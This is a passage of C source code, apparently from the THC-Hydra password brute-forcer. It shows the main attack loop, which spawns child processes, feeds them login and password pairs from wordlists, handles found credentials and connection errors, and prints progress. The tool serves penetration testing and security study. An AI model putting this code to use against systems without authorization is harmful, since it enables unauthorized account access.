    if (hydra_options.pass != NULL)
      fprintf(hydra_brains.ofp, "-p %s ", hydra_options.pass);
    if (hydra_options.colonfile != NULL)
      fprintf(hydra_brains.ofp, "-C %s ", hydra_options.colonfile);
    if (hydra_options.loginfile != NULL)
      fprintf(hydra_brains.ofp, "-L %s ", hydra_options.loginfile);
    if (hydra_options.passfile != NULL)
      fprintf(hydra_brains.ofp, "-P %s ", hydra_options.passfile);
    if (hydra_options.try_password_same_as_login)
      fprintf(hydra_brains.ofp, "-e s ");
    if (hydra_options.try_null_password)
      fprintf(hydra_brains.ofp, "-e n ");
    if (hydra_options.ssl)
      fprintf(hydra_brains.ofp, "-S ");
    if (hydra_options.exit_found)
      fprintf(hydra_brains.ofp, "-f ");
    if (hydra_options.tasks != TASKS)
      fprintf(hydra_brains.ofp, "-t %d ", hydra_options.tasks);
    if (waittime != WAITTIME)
      fprintf(hydra_brains.ofp, "-w %d ", waittime);
    if (verbose == 1 && debug == 0)
      fprintf(hydra_brains.ofp, "-v ");
    if (debug)
      fprintf(hydra_brains.ofp, "-d ");
    if (hydra_options.showAttempt)
      fprintf(hydra_brains.ofp, "-V ");
    if (hydra_options.infile_ptr != NULL)
      fprintf(hydra_brains.ofp, "-M %s ", hydra_options.infile_ptr);
    if (hydra_options.outfile_ptr != NULL)
      fprintf(hydra_brains.ofp, "-o %s ", hydra_options.outfile_ptr);
    fprintf(hydra_brains.ofp, "%s %s", hydra_options.server == NULL ? "" : hydra_options.server, hydra_options.service);
    fprintf(hydra_brains.ofp, ")\n");
  }

  /* we have to flush all writeable buffered file pointers before forking */
#ifdef NESSUS_PLUGIN
  svc_kb_name = malloc(40 + strlen(hydra_options.service));
  sprintf(svc_kb_name, "Services/%s", hydra_options.service);
  asc_port = plug_get_key(nessus, svc_kb_name);
  if (asc_port)
    port = atoi(asc_port);
  free(svc_kb_name);
  if (port && host_get_port_state(nessus, port) == 0)
    return 0;
  if (port && IS_ENCAPS_SSL(plug_get_port_transport(nessus, port)))
    options |= OPTION_SSL;
  if (soc >= 0)
    hydra_brains.ofp = fdopen(soc, "r+");
#endif
  /* set appropriate signals for mother */
  signal(SIGCHLD, killed_childs);
  signal(SIGTERM, kill_children);
  signal(SIGSEGV, kill_children);
  signal(SIGHUP, kill_children);
  signal(SIGINT, kill_children);
  signal(SIGPIPE, SIG_IGN);
  if (verbose)
    printf("[VERBOSE] Resolving addresses ... ");
  for (i = 0; i < countservers; i++) {
#ifdef CYGWIN
    if (inet_aton(hydra_targets[i]->target, &in) <= 0) {
#else
    if (inet_pton(AF_INET, hydra_targets[i]->target, &in) <= 0) {
#endif
      if ((target = gethostbyname(hydra_targets[i]->target)) != NULL)
        memcpy(&hydra_targets[i]->ip, target->h_addr, 4);
      else {
        if (verbose)
          printf("[failed for %s] ", hydra_targets[i]->target);
        else
          fprintf(stderr, "Error: Can not resolve %s\n", hydra_targets[i]->target);
        hydra_targets[i]->done = 2;
        hydra_brains.targets--;
      }
    } else {
      memcpy(&hydra_targets[i]->ip, &in.s_addr, 4);
    }
  }
  if (verbose)
    printf("done\n");
  if (hydra_brains.targets == 0)
    bail("No server to scan!");

  hydra_arms = malloc(sizeof(hydra_arms) * hydra_options.tasks);
  for (i = 0; i < hydra_options.tasks; i++) {
    hydra_arms[i] = malloc(sizeof(hydra_arm));
    memset(hydra_arms[i], 0, sizeof(hydra_arm));        /* some old unixes dont zero the memory */
  }

  starttime = elapsed_status = elapsed_restore = time(NULL);
  fflush(stdout);
  fflush(stderr);
  fflush(hydra_brains.ofp);

  hydra_debug(0, "attack");

  /* this is the big function which starts the attacking children, feeds login/password pairs, etc.! */
  while (hydra_brains.finished < hydra_brains.targets && error == 0) {
    FD_ZERO(&fdreadarms);
    for( arm_no=0, max_fd=1; arm_no < hydra_options.tasks; arm_no++) {
      if(hydra_arms[arm_no]->active > 0 ) {
	 FD_SET(hydra_arms[arm_no]->sp[0],&fdreadarms);
      if(max_fd<hydra_arms[arm_no]->sp[0])
        max_fd=hydra_arms[arm_no]->sp[0];
      }           
    }
    my_select(max_fd+1,&fdreadarms,NULL,NULL,0,200000);
    for (arm_no = 0; arm_no < hydra_options.tasks; arm_no++) {
      target_no = hydra_arms[arm_no]->target_no;
      if (hydra_arms[arm_no]->active >= 0 /* hydra_arms[arm_no]->fail_count < MAXFAIL */ ) {
        if (hydra_arms[arm_no]->active == 0) {
          if (hydra_arms[arm_no]->redo == 0) {  /* nothing to do if redo == 1 */
            if (hydra_brains.targets > 1) {
              /* select the next best target (primary key: fewest use count, secondary key: fewest fail count) */
              target_no = i = j = 0;
              while (j < MAXTASKS
                     && (hydra_targets[target_no]->use_count >= hydra_targets[target_no]->max_use_count || hydra_targets[target_no]->use_count > j
                         || hydra_targets[target_no]->fail_count > i || hydra_targets[target_no]->done > 0)) {
                target_no = 0;
                i = MAXFAIL;
                for (target_no = 0; target_no < hydra_brains.targets; target_no++)
                  if (hydra_targets[target_no]->use_count < hydra_targets[target_no]->max_use_count && hydra_targets[target_no]->use_count <= j
                      && hydra_targets[target_no]->done == 0 && hydra_targets[target_no]->fail_count < MAXFAIL)
                    if (hydra_targets[target_no]->fail_count < i)
                      i = hydra_targets[target_no]->fail_count;
                target_no = 0;
                while (target_no < hydra_brains.targets
                       && (hydra_targets[target_no]->use_count >= hydra_targets[target_no]->max_use_count || hydra_targets[target_no]->use_count > j
                           || hydra_targets[target_no]->done > 0 || hydra_targets[target_no]->use_count > j || hydra_targets[target_no]->fail_count > i))
                  target_no++;
                j++;
                if (target_no >= hydra_brains.targets)
                  target_no = 0;        /* we get an overflow otherwise */
              }
              if (j == MAXTASKS)        /* this means there is no server available! - might be because they are all done or the max_use_count is reached */
	      	target_no = -1; 
              if (debug)
                printf("[DEBUG] selected target no %d for child %d (%d fail_count/%d use_count)\n", target_no, arm_no, hydra_targets[target_no]->fail_count,
                       hydra_targets[target_no]->use_count);
            } else
              target_no = 0;
	  }
          
	  if (target_no >= 0 && hydra_targets[target_no]->done == 0)    /* just to be sure */
            hydra_spawn_arm(arm_no, target_no);
          else {                /* we have to disable this arm - completely */
            /* hydra_arms[arm_no]->fail_count = MAXFAIL; */
            hydra_arms[arm_no]->active = -1;
            if (verbose)
              printf("[VERBOSE] disabled child %d\n", arm_no);
          }
        }
        /* here we go in with sending the correct login/pw data to the child and checking its responses */
	if (hydra_arms[arm_no]->active > 0 && FD_ISSET(hydra_arms[arm_no]->sp[0],&fdreadarms)) {
	  if (read_safe(hydra_arms[arm_no]->sp[0], &rc, 1) > 0) {
	      FD_CLR(hydra_arms[arm_no]->sp[0],&fdreadarms);
            hydra_arms[arm_no]->last_seen = time(NULL);

            switch (rc) {
              /* Valid Results:
               *  n - mother says to itself that child requests next login/password pair
               *  N - child requests next login/password pair
               *  Q - child reports that it is quitting
               *  C - child reports connect error (and is quitting)
               *  E - child reports protocol error (and is quitting)
               *  f - child reports that the username does not exist
               *  F - child reports that it found a valid login/password pair
               *        and requests next pair. Sends login/pw pair with next msg!
               */

            case 'F':
              hydra_brains.found++;
              if (hydra_options.exit_found) {   /* option set says quit target after on valid login/pass pair is found */
                for (j = 0; j < hydra_options.tasks; j++)
                  if (hydra_arms[arm_no]->active > 0 && hydra_arms[arm_no]->target_no == target_no)
                    hydra_kill_arm(j, 1, 0);    /* kill all arms working on the target */
                if (hydra_targets[target_no]->done == 0) {
                  hydra_targets[target_no]->done = 1;   /* mark target as done */
                  hydra_brains.finished++;
                  printf("[STATUS] attack finished for %s (valid pair found)\n", hydra_targets[target_no]->target);
                }
                continue;
              }
              // fall through
            case 'f':
              memset(buf, 0, sizeof(buf));
	      read_safe(hydra_arms[arm_no]->sp[0], buf, MAXBUF);
              if (hydra_options.colonfile == NULL) {
                if (strcmp(buf, hydra_targets[target_no]->login_ptr) == 0) {
                  if (verbose && rc == 'F')
                    printf("[VERBOSE] Skipping current login as we cracked it\n");
                  if (verbose && rc == 'f')
                    printf("[VERBOSE] Skipping current login as the service reported it does not exist\n");
                  if (hydra_targets[target_no]->pass_no + 1 < hydra_brains.countpass)
                    hydra_targets[target_no]->sent += hydra_brains.countpass - hydra_targets[target_no]->pass_no;
                  hydra_targets[target_no]->pass_no = hydra_brains.countpass;
                  hydra_targets[target_no]->pass_state = 0;
                  while (hydra_next_pair(target_no) > 0);
                  if (hydra_targets[target_no]->done) { /* uh, that was the last - exit childs */
                    for (j = 0; j < hydra_options.tasks; j++)
                      if (hydra_arms[arm_no]->active > 0 && hydra_arms[arm_no]->target_no == target_no)
                        hydra_kill_arm(j, 1, 0);        /* kill all arms working on the target */
                    if (hydra_targets[target_no]->done == 0) {
                      hydra_targets[target_no]->done = 1;       /* mark target as done */
                      hydra_brains.finished++;
                      printf("[STATUS] attack finished for %s\n", hydra_targets[target_no]->target);
                    }
                    continue;
                  }
                }
              }
                hydra_targets[target_no]->pass_state = 2;
              /* no break here */

            case 'N':
              hydra_targets[target_no]->fail_count = 0;
              /* no break here */

            case 'n':
              if (hydra_targets[target_no]->done) {
                hydra_kill_arm(arm_no, 1, 0);
              } else {
                if (hydra_arms[arm_no]->redo) {
                  hydra_arms[arm_no]->redo = 0;
                } else {
/* goto label */ ens:
                  hydra_arms[arm_no]->current_login_ptr = hydra_targets[target_no]->login_ptr;
                  /* first check for null/login as password options */
                  if (hydra_targets[target_no]->pass_state < hydra_options.try_null_password + hydra_options.try_password_same_as_login) {
                    hydra_targets[target_no]->pass_no++;
                    if (hydra_targets[target_no]->pass_state == 0 && hydra_options.try_null_password) {
                      hydra_arms[arm_no]->current_pass_ptr = empty_login;
                      hydra_targets[target_no]->pass_state = 1;
                    } else {
                      hydra_arms[arm_no]->current_pass_ptr = hydra_targets[target_no]->login_ptr;
                      hydra_targets[target_no]->pass_state = 2;
                      if (strlen(hydra_arms[arm_no]->current_login_ptr) == 0 && hydra_options.try_null_password) {
                        /* very special case: login is empty and we activated both null_password and same_as_login */
                        hydra_brains.sent++;
                        hydra_targets[target_no]->sent++;
                        goto ens;
                      }
                    }
                  }
                else {      /* send login/pass from list */
                  if (hydra_brains.countpass == 1 && (hydra_options.try_null_password + hydra_options.try_password_same_as_login > 0)) {
/*
                      if (hydra_targets[target_no]->sent == hydra_brains.todo) {
                        printf("BREAK\n");
                        break;
                      }
*/
                      hydra_next_pair(target_no);
                      goto ens;
                    }
                    hydra_arms[arm_no]->current_pass_ptr = hydra_targets[target_no]->pass_ptr;
                    if (hydra_targets[target_no]->pass_state > 0) {
                      if (
                          (hydra_options.try_null_password && strlen(hydra_arms[arm_no]->current_pass_ptr) == 0)
                         ||
                          (hydra_options.try_password_same_as_login && strcmp(hydra_arms[arm_no]->current_login_ptr, hydra_arms[arm_no]->current_pass_ptr) == 0)
                         ) {
                        hydra_brains.sent++;
                        hydra_targets[target_no]->sent++;
                        while (hydra_next_pair(target_no) > 0 && hydra_targets[target_no]->pass_state > 0) {
                          hydra_brains.sent++;
                          hydra_targets[target_no]->sent++;
                        }
                        if (hydra_targets[target_no]->pass_state == 0)
                          goto ens;
                        hydra_arms[arm_no]->current_pass_ptr = hydra_targets[target_no]->pass_ptr;
                      }
                    }
                    /* point to next structure or mark as done */
                    while (hydra_next_pair(target_no) > 0 || (strcmp(hydra_arms[arm_no]->current_pass_ptr, hydra_targets[target_no]->pass_ptr) == 0 && hydra_targets[target_no]->sent + 1 < hydra_brains.todo && hydra_brains.countpass > 1 + hydra_options.try_password_same_as_login + hydra_options.try_null_password)) {
                      hydra_brains.sent++;
                      hydra_targets[target_no]->sent++;
                    }
                  }
                  hydra_brains.sent++;
                  hydra_targets[target_no]->sent++;
                }
                memset(&buf, 0, sizeof(buf));
                strcpy(buf, hydra_arms[arm_no]->current_login_ptr);
                buflen = strlen(hydra_arms[arm_no]->current_login_ptr) + 1;
                strcpy(buf + buflen, hydra_arms[arm_no]->current_pass_ptr);
                buflen += strlen(hydra_arms[arm_no]->current_pass_ptr) + 1;
                write(hydra_arms[arm_no]->sp[0], buf, buflen);
                if (debug || hydra_options.showAttempt) {
                    printf("[ATTEMPT] target %s - login \"%s\" - pass \"%s\" - child %d - %lu of %lu\n",
                           hydra_targets[target_no]->target, hydra_arms[arm_no]->current_login_ptr, hydra_arms[arm_no]->current_pass_ptr, arm_no,
                           hydra_targets[target_no]->sent, hydra_brains.todo);
                }
              }
              break;            /* yes, finally there is a break */

              /* we do not make a difference between 'C' and 'E' results - yet */
            case 'C':
            case 'E':
              hydra_targets[target_no]->fail_count++;
              if (hydra_targets[target_no]->fail_count >= MAXFAIL) {
                hydra_kill_arm(arm_no, 1, 0);
                if (hydra_targets[target_no]->use_count == 0) {
                  if (hydra_targets[target_no]->done == 0) {
                    hydra_targets[target_no]->done = 2; /* mark target as done */
                    hydra_brains.finished++;
                    fprintf(stderr, "Error: Too many connect errors to target, disabling %s\n", hydra_targets[target_no]->target);
                  }
                } else {
                  if (hydra_targets[target_no]->max_use_count > hydra_targets[target_no]->use_count && hydra_targets[target_no]->use_count > 0) {
                    hydra_targets[target_no]->max_use_count = hydra_targets[target_no]->use_count;
                    if (verbose)
                      printf("[VERBOSE] Reducing maximum tasks for %s to %d\n", hydra_targets[target_no]->target, hydra_targets[target_no]->max_use_count);
                  }
                }
                if (debug)
                  printf("[DEBUG] - will not be tested: ip %s - login %s - pass %s - child %d\n", hydra_targets[target_no]->target,
                         hydra_arms[arm_no]->current_login_ptr, hydra_arms[arm_no]->current_pass_ptr, arm_no);
              } else {
                hydra_kill_arm(arm_no, 1, 1);
                if (verbose)
                  printf("[VERBOSE] Retrying connection for child %d\n", arm_no);
              }
              break;

            case 'Q':
              hydra_kill_arm(arm_no, 1, 0);
              if (debug)
                printf("[DEBUG] children %d reported it quit\n", arm_no);
              break;

            default:
              hydra_kill_arm(arm_no, 1, 1);
              fprintf(stderr, "Error: child %d send nonsense data, killing and restarting it!\n", arm_no);
            }                   /* END OF switch(rc) */
          } else if (errno != EAGAIN) {
            if (verbose)
              fprintf(stderr, "Warning: child %d reported error no %d, terminating it and restarting ...\n", arm_no, errno);
            hydra_kill_arm(arm_no, 1, 1);
          } else if (kill(hydra_arms[arm_no]->pid, 0) < 0) {
            hydra_kill_arm(arm_no, 0, 1);
          } else if (time(NULL) >= waittime * 5 + hydra_arms[arm_no]->last_seen) {
            hydra_kill_arm(arm_no, 1, 1);
            fprintf(stderr, "Warning: Timeout from child %d, restarting\n", arm_no);
          }
          /* END OF read(sp, &rc) */
        }                       /* END OF hydra_arms->active */
      }                         /* END OF hydra_arms->fail_count < MAXFAIL */
    }                           /* END OF for (arm_no = 0; arm_no++) */
    (void) wait3(NULL, WNOHANG, NULL);
    /* write restore file and report status */
    if (process_restore == 1 && time(NULL) - elapsed_restore > 299) {
      hydra_restore_write(0);
      elapsed_restore = time(NULL);
    }
    if (time(NULL) - elapsed_status > status_print) {
      elapsed_status = time(NULL);
      tmp_time = elapsed_status - starttime;
      if (tmp_time < 1)
        tmp_time = 1;
      tmp_time = hydra_brains.sent / tmp_time;
      if (tmp_time < 1)
        tmp_time = 1;
      if (status_print < 15 * 59)
        status_print = ((status_print + 1) * 2) - 1;
      if (status_print > 299 && (hydra_brains.todo_all - hydra_brains.sent) / tmp_time < 1500)
        status_print = 299;
      if (((hydra_brains.todo_all - hydra_brains.sent) / tmp_time) < 150)
        status_print = 59;
      /* XXX is it %02d instead of %02lu ? */
      printf("[STATUS] %.2f tries/min, %lu tries in %02lu:%02luh, %lu todo in %02lu:%02luh\n",
             (1.0 * hydra_brains.sent) / (((elapsed_status - starttime) * 1.0) / 60), /* tries/min */
             hydra_brains.sent, /* tries */
             (long unsigned int) ((elapsed_status - starttime) / 3600), /* hours */
             (long unsigned int) (((elapsed_status - starttime) % 3600) / 60), /* minutes */
             hydra_brains.todo_all - hydra_brains.sent, /* left todo */
             (long unsigned int)(
                ((double)hydra_brains.todo_all - hydra_brains.sent) /
                ((double)hydra_brains.sent / (elapsed_status - starttime))
              ) / 3600, /* hours */
             (((long unsigned int)(
                  ((double)hydra_brains.todo_all - hydra_brains.sent) /
                  ((double)hydra_brains.sent / (elapsed_status - starttime))
                ) % 3600) / 60) + 1 /* min */
      );
    }
    /* check if there are still childrens alive */
    if (hydra_brains.finished < hydra_brains.targets) {
      /* this small for loop ensures that no children is gone without detection */
      j = 0;
      for (i = 0; i < hydra_options.tasks; i++)
        if (hydra_arms[i]->active > 0)
          j++;
      if (j == 0 && recheck) {
        fprintf(stderr, "Error: All childrens are dead!\n");
        error = 1;
      }
      if (j == 0)
        recheck = 1;
      else
        recheck = 0;
    }
  }                             /* END OF while(! finished) loop */

  /* Now: wait for clients, terminate them if they take too long */
  j = 0;
  for (i = 0; i < hydra_brains.targets; i++)
    if (hydra_targets[i]->done != 1)
      j++;
  if (j > 0)
    error = 1;
  if (error == 0) {
    process_restore = 0;
    unlink(RESTOREFILE);
    for (i = 0; i < hydra_options.tasks; i++)
      if (hydra_arms[i]->active > 0)
        write(hydra_arms[i]->sp[0], HYDRA_EXIT, sizeof(HYDRA_EXIT));
    error = j = 0;
    while (error < MAXENDWAIT && j < hydra_options.tasks) {      /* hardcoded timeout of 15 seconds */
      j = 0;
      for (i = 0; i < hydra_options.tasks; i++) {
	if (hydra_arms[i]->active > 0 && read_safe(hydra_arms[i]->sp[0], &rc, 1) > 0)
          hydra_kill_arm(i, 1, 0);
        if (hydra_arms[i]->active <= 0 || kill(hydra_arms[i]->pid, 0) < 0) {
          j++;
          hydra_arms[i]->active = 0;
        }
      }
      if (j < hydra_options.tasks)
        sleep(1);
      error++;
    }
    error = 0;
  } else {
    if (j > 0) {
      printf("[INFO] Writing restore file because %d server scans could not be completed\n", j);
      hydra_restore_write(1);
    }
  }

  for (i = 0; i < hydra_options.tasks; i++)
    if (hydra_arms[i]->active > 0)
      hydra_kill_arm(i, 1, 0);
  (void) wait3(NULL, WNOHANG, NULL);

  /* yeah we did it */
  printf("%s (%s) finished at %s\n", PROGRAM, RESSOURCE, hydra_build_time());
  if (hydra_brains.ofp != NULL && hydra_brains.ofp != stdout)
    fclose(hydra_brains.ofp);

  fflush(NULL);
  if (error)
    return 1;
  else
    return 0;
}

#ifndef NESSUS_PLUGIN
int
main(int argc, char *argv[])
{
  return hydra_main(-1, NULL, argc, argv);
}
#endif
